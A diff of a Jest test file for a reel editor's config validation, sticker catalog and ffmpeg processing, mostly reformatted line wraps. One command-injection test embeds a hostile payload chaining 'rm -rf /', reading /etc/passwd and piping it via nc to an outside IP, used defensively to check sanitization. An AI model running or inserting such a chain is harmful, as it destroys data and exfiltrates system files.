@@ -52,7 +52,10 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
   };
 
   beforeAll(() => {
-    tempDir = path.join(os.tmpdir(), `p3d_test_${Date.now()}_${Math.random().toString(36).slice(2)}`);
+    tempDir = path.join(
+      os.tmpdir(),
+      `p3d_test_${Date.now()}_${Math.random().toString(36).slice(2)}`,
+    );
     fs.mkdirSync(tempDir, { recursive: true });
 
     videoProcessor = new CommunityVideoProcessorService();
@@ -122,7 +125,10 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
         ],
       };
 
-      const normalized = postService.validateAndNormalizeEditorConfig(config, 10);
+      const normalized = postService.validateAndNormalizeEditorConfig(
+        config,
+        10,
+      );
       expect(normalized.version).toBe(1);
       expect(normalized.layers).toHaveLength(3);
       expect(normalized.layers[0].type).toBe('TEXT');
@@ -143,7 +149,10 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
       }));
 
       expect(() => {
-        postService.validateAndNormalizeEditorConfig({ version: 1, layers }, 10);
+        postService.validateAndNormalizeEditorConfig(
+          { version: 1, layers },
+          10,
+        );
       }).toThrow(BadRequestException);
     });
 
@@ -269,7 +278,10 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
         ],
       };
 
-      const normalized = postService.validateAndNormalizeEditorConfig(config, 10);
+      const normalized = postService.validateAndNormalizeEditorConfig(
+        config,
+        10,
+      );
       const layer = normalized.layers[0];
       expect(layer.x).toBe(1.0);
       expect(layer.y).toBe(0.0);
@@ -293,7 +305,9 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
     });
 
     it('filters stickers by category accurately', () => {
-      const zeitnahStickers = stickerService.getStickerCatalog({ category: 'ZEITNAH' });
+      const zeitnahStickers = stickerService.getStickerCatalog({
+        category: 'ZEITNAH',
+      });
       expect(zeitnahStickers.items.length).toBeGreaterThan(0);
       zeitnahStickers.items.forEach((item) => {
         expect(item.category).toBe('ZEITNAH');
@@ -303,7 +317,9 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
     it('validates sticker IDs and rejects unknown sticker IDs', () => {
       expect(stickerService.isValidStickerId('zn-verified')).toBe(true);
       expect(stickerService.isValidStickerId('fire')).toBe(true);
-      expect(stickerService.isValidStickerId('malicious-external-url')).toBe(false);
+      expect(stickerService.isValidStickerId('malicious-external-url')).toBe(
+        false,
+      );
 
       const invalidConfig = {
         version: 1,
@@ -422,18 +438,38 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
       // Deterministic 3-second 720x1280 vertical video with test tone
       await runFfmpeg([
         '-y',
-        '-f', 'lavfi', '-i', 'testsrc=duration=3:size=720x1280:rate=30',
-        '-f', 'lavfi', '-i', 'sine=frequency=500:duration=3',
-        '-c:v', 'libx264', '-preset', 'ultrafast', '-pix_fmt', 'yuv420p',
-        '-c:a', 'aac', '-b:a', '128k',
+        '-f',
+        'lavfi',
+        '-i',
+        'testsrc=duration=3:size=720x1280:rate=30',
+        '-f',
+        'lavfi',
+        '-i',
+        'sine=frequency=500:duration=3',
+        '-c:v',
+        'libx264',
+        '-preset',
+        'ultrafast',
+        '-pix_fmt',
+        'yuv420p',
+        '-c:a',
+        'aac',
+        '-b:a',
+        '128k',
         sourceVideoPath,
       ]);
 
       // Deterministic 3-second AAC music track
       await runFfmpeg([
         '-y',
-        '-f', 'lavfi', '-i', 'sine=frequency=800:duration=3',
-        '-c:a', 'aac', '-b:a', '128k',
+        '-f',
+        'lavfi',
+        '-i',
+        'sine=frequency=800:duration=3',
+        '-c:a',
+        'aac',
+        '-b:a',
+        '128k',
         sourceAudioPath,
       ]);
     });
@@ -463,7 +499,10 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
       );
 
       // Create sticker layer PNG
-      const stickerAsset = stickerService.resolveStickerAsset('zn-verified', tempDir);
+      const stickerAsset = stickerService.resolveStickerAsset(
+        'zn-verified',
+        tempDir,
+      );
 
       // Process video with audio mix + overlays
       const result = await videoProcessor.processVideo(
@@ -510,9 +549,12 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
 
       // Probe final composited video
       const probe = await runFfprobe([
-        '-v', 'error',
-        '-show_entries', 'stream=codec_name,width,height,duration',
-        '-of', 'json',
+        '-v',
+        'error',
+        '-show_entries',
+        'stream=codec_name,width,height,duration',
+        '-of',
+        'json',
         result.outputPath,
       ]);
 
@@ -551,7 +593,8 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
   // ==========================================
   describe('Security & Command Injection Resistance', () => {
     it('prevents command injection through malicious layer strings', () => {
-      const injectionPayload = '; rm -rf / ; cat /etc/passwd | nc 1.2.3.4 80 & $(whoami) `id` \\n';
+      const injectionPayload =
+        '; rm -rf / ; cat /etc/passwd | nc 1.2.3.4 80 & $(whoami) `id` \\n';
       const config = {
         version: 1,
         layers: [
@@ -567,7 +610,10 @@ describe('Community Phase 3D — Advanced Reel Editor Foundation', () => {
         ],
       };
 
-      const normalized = postService.validateAndNormalizeEditorConfig(config, 10);
+      const normalized = postService.validateAndNormalizeEditorConfig(
+        config,
+        10,
+      );
       expect(normalized.layers[0].content).not.toContain('<');
       expect(normalized.layers[0].content).not.toContain('>');
 
